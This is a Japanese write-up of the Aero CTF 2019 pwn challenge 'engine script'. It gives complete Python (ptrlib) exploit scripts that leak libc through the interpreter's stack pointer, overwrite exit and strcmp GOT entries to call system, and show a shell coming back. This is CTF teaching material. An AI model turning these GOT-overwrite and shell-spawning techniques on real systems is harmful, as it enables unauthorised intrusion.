# [pwn 488pts] engine script - Aero CTF 2019
競技中に解けなくて気になっていた問題です。
writeupは探したところありませんが、挑戦してみようと思います。
32ビットバイナリです。
```
$ checksec es
[*] 'es'
    Arch:       32 bits (little endian)
    NX:         NX enabled
    SSP:        SSP enabled (Canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
```
navigation systemと同じくハードコーディングされたユーザー名/パスワードでログインすると、コードを入力できます。
コードはバイナリにより解釈されて実行されます。
スタックポインタとスタックはグローバル変数としてbssセクションに存在します。
競技中にlibcのバージョンをリークするプログラムを作っていたのでこれを活用します。
仕組みは単純で、スタックポインタをデクリメントしてGOTの位置に合わせて、スタックポインタの内容をputcharで出力することで関数のアドレスをリークしています。
```python
from ptrlib import *

elf = ELF("./es")

def inc():
    return chr(0x61 + 0)
def dec():
    return chr(0x61 + 18)
def inc_sp():
    return chr(0x61 + 20)
def dec_sp():
    return chr(0x61 + 3)
def getchar():
    return chr(0x61 + 6)
def putchar():
    return chr(0x61 + 15)

sp = elf.symbol("stack")
got_setvbuf = elf.got("setvbuf")
got_putchar = elf.got("putchar")
dump("&stack = " + hex(sp))
dump("setvbuf@got = " + hex(got_setvbuf))
dump("putchar@got = " + hex(got_putchar))

payload = ""
payload += dec_sp() * (sp - got_setvbuf)
# leak <setvbuf>
for i in range(4):
    payload += putchar() + inc_sp()
for i in range(4):
    payload += inc_sp()
# leak <putchar>
for i in range(4):
    payload += putchar() + inc_sp()

#sock = Process("./es")
sock = Socket("185.66.87.233", 5001)
#sock = Socket("localhost", 5001)
#_ = input()
sock.recvuntil("Login: ")
sock.sendline("admin")
sock.recvuntil("Password: ")
sock.sendline("password")
sock.recvuntil("here: ")
sock.send(payload)

# leak <setvbuf>
addr = sock.recvonce(4)
if addr is None:
    dump("Bad luck!", "warning")
    exit(1)
addr_setvbuf = u64(addr)
dump("<setvbuf> = " + hex(addr_setvbuf))

# leak <putchar>
addr = sock.recvonce(4)
if addr is None:
    dump("Bad luck!", "warning")
    exit(1)
addr_putchar = u64(addr)
dump("<putchar> = " + hex(addr_putchar))

sock.close()
```
libc databaseからlibcのバージョンを特定できます。(2.27でした)

libcのロードアドレスをリークした段階で実行ファイルは終了してしまうので、main関数を呼び出すなどして2周目に突入する必要があります。
ということで、まずはexit関数のGOTを`_start`のアドレスで上書きしましょう。

scanfの改行がgetcharで取れてしまうので最初に一度getcharしておきます。
```python
from ptrlib import *

elf = ELF("./es")

def inc():
    return chr(0x61 + 0)
def dec():
    return chr(0x61 + 18)
def inc_sp():
    return chr(0x61 + 20)
def dec_sp():
    return chr(0x61 + 3)
def getchar():
    return chr(0x61 + 6)
def putchar():
    return chr(0x61 + 15)
def illegal_opecode():
    return chr(0xff)

sp = elf.symbol("stack")
got_setvbuf = elf.got("setvbuf")
got_putchar = elf.got("putchar")
got_exit = elf.got("exit")
addr_start = elf.symbol("_start")

payload = getchar()
payload += dec_sp() * (sp - got_setvbuf)
sp -= sp - got_setvbuf
# leak <setvbuf>
for i in range(4):
    payload += putchar() + inc_sp()
    sp += 1
for i in range(4):
    payload += inc_sp()
    sp += 1
# leak <putchar>
for i in range(4):
    payload += putchar() + inc_sp()
    sp += 1
# overwrite <exit>
payload += dec_sp() * (sp - got_exit)
for i in range(4):
    payload += getchar() + inc_sp()
payload += illegal_opecode()

#sock = Process("./es")
#libc = ELF("./libc-2.27.so")
#sock = Socket("185.66.87.233", 5001)
libc = ELF("/lib/libc.so.6")
sock = Socket("localhost", 5001)
_ = input()

sock.recvuntil("Login: ")
sock.sendline("admin")
sock.recvuntil("Password: ")
sock.sendline("password")
sock.recvuntil("here: ")
sock.send(payload)

# leak <setvbuf>
addr = sock.recvonce(4)
if addr is None:
    dump("Bad luck!", "warning")
    exit(1)
addr_setvbuf = u64(addr)
dump("<setvbuf> = " + hex(addr_setvbuf))

# leak <putchar>
addr = sock.recvonce(4)
if addr is None:
    dump("Bad luck!", "warning")
    exit(1)
addr_putchar = u64(addr)
dump("<putchar> = " + hex(addr_putchar))

libc_base = addr_putchar - libc.symbol("putchar")
dump("libc base = " + hex(libc_base))

# overwrite <exit>
for i in range(4):
    sock.send(p32(addr_start))

sock.interactive()
```
こんな感じでlibcのロードアドレスが取れている状態で2周目に突入します。
ただし、一度認証済みなので2周目では認証はいりません。
```
$ python solve.py 
[+] Socket: Successfully connected to localhost:5001

[ptrlib] <setvbuf> = 0xf76062c0
[ptrlib] <putchar> = 0xf76079f0
[ptrlib] libc base = 0xf759d000
[ptrlib]$ --------- Engine Script Emu ---------
Please authorization on system
Login: Input your code here: --------- Engine Script Emu ---------
Please authorization on system
Login: Input your code here:
```

そこで思いついたのが、strcmpを使う方法です。
strcmpの第一引数には自分の入力が入るので、strcmpのGOTにsystemのアドレスを書き込み、authを0に書き換えて3周目で認証させ、パスワードやユーザー名として`/bin/sh`を渡せばシェルが奪えそうです。
というわけで2周目ではauthを0にし、strcmpのGOTを書き換えましょう。

```python
from ptrlib import *

elf = ELF("./es")

def inc():
    return chr(0x61 + 0)
def dec():
    return chr(0x61 + 18)
def inc_sp():
    return chr(0x61 + 20)
def dec_sp():
    return chr(0x61 + 3)
def getchar():
    return chr(0x61 + 6)
def putchar():
    return chr(0x61 + 15)
def illegal_opecode():
    return chr(0xff)

#sock = Process("./es")
#libc = ELF("./libc-2.27.so")
#sock = Socket("185.66.87.233", 5001)
libc = ELF("/lib/libc.so.6")
sock = Socket("localhost", 5001)
_ = input()

""" Stage 1 """
sp = elf.symbol("stack")
got_setvbuf = elf.got("setvbuf")
got_putchar = elf.got("putchar")
got_exit = elf.got("exit")
addr_start = elf.symbol("_start")

payload = getchar()
payload += dec_sp() * (sp - got_setvbuf)
sp -= sp - got_setvbuf
# leak <setvbuf>
for i in range(4):
    payload += putchar() + inc_sp()
    sp += 1
for i in range(4):
    payload += inc_sp()
    sp += 1
# leak <putchar>
for i in range(4):
    payload += putchar() + inc_sp()
    sp += 1
# overwrite <exit>
payload += dec_sp() * (sp - got_exit)
for i in range(4):
    payload += getchar() + inc_sp()
payload += illegal_opecode()

sock.recvuntil("Login: ")
sock.sendline("admin")
sock.recvuntil("Password: ")
sock.sendline("password")
sock.recvuntil("here: ")
sock.send(payload)

# leak <setvbuf>
addr = sock.recvonce(4)
if addr is None:
    dump("Bad luck!", "warning")
    exit(1)
addr_setvbuf = u64(addr)
dump("<setvbuf> = " + hex(addr_setvbuf))

# leak <putchar>
addr = sock.recvonce(4)
if addr is None:
    dump("Bad luck!", "warning")
    exit(1)
addr_putchar = u64(addr)
dump("<putchar> = " + hex(addr_putchar))

libc_base = addr_putchar - libc.symbol("putchar")
addr_system = libc_base + libc.symbol("system")
dump("libc base = " + hex(libc_base))
dump("<sytem> = " + hex(addr_system))

# overwrite <exit>
sock.send(p32(addr_start))

dump("Stage 1: Done!", "success")

## Stage 2
sp = elf.symbol("stack")
got_strcmp = elf.got("strcmp")
addr_auth = elf.symbol("auth")

payload = ''
payload += dec_sp() * (sp - got_strcmp)
sp -= sp - got_strcmp
# overwrite <strcmp>
for i in range(4):
    payload += getchar() + inc_sp()
    sp += 1
# overwrite <auth>
payload += inc_sp() * (addr_auth - sp)
payload += getchar() * 4
payload += illegal_opecode()

sock.recvuntil("Input your code here: ")
sock.send(payload)

# overwrite <strcmp>
sock.send(p32(addr_system))
# overwrite <auth>
sock.send(p32(0))

dump("Stage 2: Done!", "success")

""" Stage 3 """
sock.recvuntil("Login: ")
sock.sendline("/bin/sh;")
sock.recvuntil("Password: ")
sock.sendline("/bin/sh;")
dump("Stage 3: Done!", "success")

sock.interactive()
```

できました！
ローカルで試してますが、libcのバージョンも特定できているので本番サーバーでも動くはずです。
```
$ python solve.py 
[+] Socket: Successfully connected to localhost:5001
[ptrlib] <setvbuf> = 0xf76282c0
[ptrlib] <putchar> = 0xf76299f0
[ptrlib] libc base = 0xf75bf000
[ptrlib] <sytem> = 0xf75fde90
[+] Stage 1: Done!
[+] Stage 2: Done!
[+] Stage 3: Done!
[ptrlib]$ whoami
ptr
[ptrlib]$
```

# 感想
bssセクション周りの書き換えでシェルを奪う面白い問題でした。
ほんの2週間前に解けなかった問題が解けたということは、pwn力が向上したのでは！？
